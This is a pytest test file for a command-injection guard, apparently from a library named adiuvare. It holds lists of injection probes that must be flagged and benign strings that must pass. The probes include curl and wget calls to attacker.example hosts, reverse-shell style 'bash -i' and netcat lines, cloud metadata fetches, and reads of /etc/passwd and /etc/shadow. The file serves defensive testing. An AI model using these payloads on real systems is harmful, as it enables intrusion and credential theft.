import pytest
from adiuvare import Guard


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _check(payload: str):
    guard = Guard()
    return guard.check_sync("probe-user", payload=payload)


def _is_flagged(payload: str) -> bool:
    _, event = _check(payload)
    return event is not None and event.score > 0.0


# ---------------------------------------------------------------------------
# Malicious probes — all must be flagged
# ---------------------------------------------------------------------------

# Shell separator (&&, ||, ;, |) followed by a dangerous command.
_SEP_PROBES = [
    "q=hello && curl http://evil.example/x",
    "name=foo || wget http://attacker.example/s.sh",
    "id=1; bash -i",
    "file=report.pdf; sh /tmp/x",
    "input=data | python -c 'import os;os.system(\"id\")'",
    "msg=hi | nc 10.0.0.1 4444",
    "search=test && php -r 'system(\"id\");'",
    "q=x | perl -e 'exec(\"/bin/sh\")'",
    "file=log.txt | rm -rf /tmp/work",
]

# $() subshell substitution.
_SUBSHELL_PROBES = [
    "url=$(curl http://169.254.169.254/latest/meta-data/)",
    "data=$(wget -qO- http://attacker.example/token)",
    "cmd=$(bash -c 'whoami')",
    "out=$(python -c 'import socket;print(socket.gethostname())')",
    "x=$(sh -i 2>&1)",
]

# Backtick substitution.
_BACKTICK_PROBES = [
    "name=`cat /etc/shadow`",
    "token=`curl http://evil.example/steal`",
    "file=`wget -O /tmp/shell http://attacker.example/s`",
    "user=`id`",
    "user=`whoami`",
    "shell=`bash -i`",
]

# /etc/passwd access via different separators.
_PASSWD_PROBES = [
    "; cat /etc/passwd",
    "&& cat /etc/passwd",
    "| cat /etc/passwd",
]


@pytest.mark.parametrize("payload", _SEP_PROBES)
def test_cmd_separator_probes_flagged(payload):
    assert _is_flagged(payload) is True


@pytest.mark.parametrize("payload", _SUBSHELL_PROBES)
def test_cmd_subshell_probes_flagged(payload):
    assert _is_flagged(payload) is True


@pytest.mark.parametrize("payload", _BACKTICK_PROBES)
def test_cmd_backtick_probes_flagged(payload):
    assert _is_flagged(payload) is True


@pytest.mark.parametrize("payload", _PASSWD_PROBES)
def test_etc_passwd_probes_flagged(payload):
    assert _is_flagged(payload) is True


# ---------------------------------------------------------------------------
# Benign payloads — must NOT be flagged (false-positive boundary)
#
# These assert that plain prose, documentation snippets, and legitimate URLs
# that merely mention shell command names or operators are not blocked.
# ---------------------------------------------------------------------------

_BENIGN_PAYLOADS = [
    # Fenced code block — context makes the intent clear.
    "```bash\ncurl https://example.com/api\n```",
    # Plain prose that names commands but has no separator + command pattern.
    "Use curl to fetch remote resources in your scripts.",
    "wget is a non-interactive network downloader.",
    "bash is the GNU Bourne Again shell.",
    "python scripts can be run with the python interpreter.",
    # | appearing as a prose operator, not a shell pipe into a command.
    "The pipe operator | is used to chain commands in a shell tutorial.",
    # for-loop in a description — separator present but no dangerous command follows.
    "In a shell script you might write: for f in *.log; do echo $f; done",
    # && in a URL query string — not a shell context.
    "https://example.com/search?q=foo&&page=2",
    # Command name as a positional argument, no preceding separator.
    "Example: python manage.py runserver",
]


@pytest.mark.parametrize("payload", _BENIGN_PAYLOADS)
def test_benign_payloads_not_flagged(payload):
    gate, _ = _check(payload)
    assert gate.passed is True
